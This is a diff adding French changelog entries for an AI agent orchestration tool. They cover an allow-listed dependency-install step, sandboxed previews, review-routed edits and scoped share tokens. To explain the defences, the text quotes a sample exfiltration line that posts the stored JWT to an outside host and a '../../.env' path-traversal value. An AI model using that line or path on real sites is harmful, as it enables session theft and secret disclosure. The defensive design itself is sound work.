@@ -9,6 +9,90 @@ et ce projet adhère au [Semantic Versioning](https://semver.org/spec/v2.0.0.htm
 
 ### Added
 
+- **📦 L'environnement — l'agent installe ce dont il a besoin** (module pur
+  `src/shared/preparation.ts`, champ `prepareCommand` sur
+  `POST /api/projects/:id/merge/run`). `npm test` sur un clone frais échoue
+  faute de `node_modules` : le verdict qui remontait disait « tests en échec »
+  là où il fallait lire « environnement absent », et l'hôte partait chercher une
+  régression dans du code qui allait très bien. **La préparation installe ce que
+  le DÉPÔT déclare, jamais ce que la COMMANDE nomme** — `npm ci` lit le
+  `package-lock.json` du dépôt, `npm install lodash` laisse le hub décider de ce
+  qui s'exécute sur la machine d'un membre. La frontière de confiance de la
+  ruche est le dépôt que l'hôte a choisi de connecter, et elle le reste. Trois
+  refus, chacun fermant un chemin distinct : **binaire** hors liste (`sh`,
+  `curl`, `make`), **sous-commande** hors liste (`npm run deploy` est du code
+  arbitraire déguisé en installation), et **argument positionnel** — c'est lui
+  qui nomme un paquet. S'y ajoutent les drapeaux qui déplacent la **source**
+  (`--index-url`, `--registry`, `--userconfig`…) : respecter la lettre de la
+  règle en laissant un tiers fournir les paquets en trahirait l'esprit. Ce que
+  ça ne protège pas, et il faut le dire : `npm ci` exécute les `postinstall` du
+  dépôt, donc qui contrôle le dépôt exécute du code sur la machine du membre,
+  exactement comme avec `npm test`. **L'ordre est la partie qui ne se voit
+  pas** : la préparation tourne avant les tests (sinon elle ne sert à rien), le
+  diff cumulé est calculé avant elle (sinon `node_modules` finit sous les yeux
+  de l'humain qui relit), et une **préparation en échec n'est pas un test
+  rouge** — les tests ne sont pas lancés, `preparedOk` le dit séparément de
+  `testsPassed`, et l'écran comme la CLI affichent « environnement non préparé »
+  au lieu d'un verdict trompeur. Garde posée **aux trois bouts** (hub en 400
+  avant le choix du nœud, nœud avant de cloner, `runMerge` avant la moindre
+  écriture) et enveloppée par le bac à sable, comme le reste. Éprouvé hors ligne
+  sur un vrai `npm ci` : dépôt à lockfile vide, script `prepare` déposant un
+  témoin que la commande de test cherche — c'est ainsi qu'on observe l'ordre au
+  lieu de le supposer.
+
+- **✏️ L'éditeur de la Reine — une retouche devient une TÂCHE** (module pur
+  `src/shared/retouche.ts`, route `POST /api/projects/:id/rayon/retouche`).
+  Le miroir du Rayon est une **copie jetable** : y écrire donnerait l'illusion
+  d'avoir corrigé quelque chose, jusqu'au prochain rafraîchissement qui
+  effacerait tout en silence. Une modification à l'écran fabrique donc une tâche
+  — titre, prompt, contenu du fichier enveloppé dans le bloc de données non
+  fiables — qui passe par la revue comme n'importe quelle production. Le bouton
+  dit « **Proposer** », jamais « Enregistrer » : le mot promet ce que le système
+  fait. Réservé au propriétaire du projet (et aux administrateurs) ; **un
+  porteur de lien de partage lit, il ne fabrique pas de travail** pour l'essaim
+  de quelqu'un d'autre — sans cette distinction, un lien envoyé « juste pour
+  montrer » deviendrait un droit de faire tourner des agents sur les machines
+  des membres.
+
+- **👁 L'Aperçu — voir ce que l'IA construit, sans lui donner la session**
+  (module pur `src/shared/apercu.ts`, route
+  `GET /api/projects/:id/apercu`). Prévisualiser un site que l'agent vient
+  d'écrire, c'est **exécuter dans le navigateur de l'hôte** du HTML et du
+  JavaScript que personne n'a relus. Servi en même origine que le tableau de
+  bord, `fetch('https://ailleurs/', {body: localStorage['hive.jwt']})` suffirait
+  à donner la ruche. Quatre murs, et le premier est celui qui compte : **origine
+  opaque** (`<iframe sandbox="allow-scripts">` **sans `allow-same-origin`** — le
+  cadre ne lit ni le `localStorage` ni les cookies) ; **aucun identifiant ne
+  circule** (le document est assemblé côté hôte et injecté par `srcdoc`, le
+  cadre n'appelle jamais la ruche) ; **réseau coupé** par une
+  `Content-Security-Policy` en tête de document (`default-src 'none'`,
+  `connect-src 'none'`, `form-action 'none'`) ; **aucune navigation** (ni
+  `allow-top-navigation`, ni `allow-popups`, ni `allow-forms` — un aperçu qui
+  peut remplacer la page par une fausse mire de connexion est un hameçonnage
+  servi depuis le domaine de confiance de l'utilisateur). Le site est replié en
+  **un document auto-suffisant** — feuilles et scripts recopiés à l'intérieur,
+  puisqu'une origine opaque sans réseau ne peut rien charger — avec les
+  fermetures de balise échappées (`</script>` dans un fichier JS est
+  l'échappatoire classique de l'inlining) et la règle de chemins du Rayon
+  réutilisée, pour que `../../.env` ne devienne pas une feuille de style parce
+  qu'il est écrit dans un `href`. Éprouvé sur un site **hostile** tentant
+  exactement ce qu'un attaquant tenterait : `localStorage=BLOQUÉ`,
+  `origine=null`, `parent=BLOQUÉ`, `Failed to fetch` — pendant que la page
+  s'affichait normalement, CSS repliée comprise.
+
+- **🔗 Le partage en lecture — montrer un projet sans donner la ruche** (module
+  pur `src/shared/partage.ts`, table latérale `partages`, routes
+  `POST/GET/DELETE /api/projects/:id/partages`). Le jeton de partage n'est
+  **pas** le jeton de ruche : préfixe `hive3_` distinct, **deux actes
+  seulement** (voir l'avancement, lire le code), valable pour **un** projet,
+  expirable (7 jours par défaut, 90 au plus) et **révocable un par un** sans
+  toucher aux autres — là où révoquer `HIVE_TOKEN` déconnecte tout l'essaim. Le
+  jugement énonce ses refus dans l'ordre qui renseigne le moins un curieux
+  (révoqué avant expiré avant mauvais projet), et le décodage exige la **forme
+  canonique** : base64url étant tolérant, `hive3_XXXX` et `hive3_XXXXy`
+  décodaient à l'identique — un identifiant qui s'écrit d'une infinité de façons
+  casse tout ce qui compte des chaînes de caractères.
+
 - **🍯 Le Rayon — les abeilles voient enfin le code** (module pur
   `src/shared/rayon.ts`, miroir `src/orchestrator/miroir.ts`, routes
   `GET /api/projects/:id/rayon` et `.../rayon/fichier`). Ce que les membres
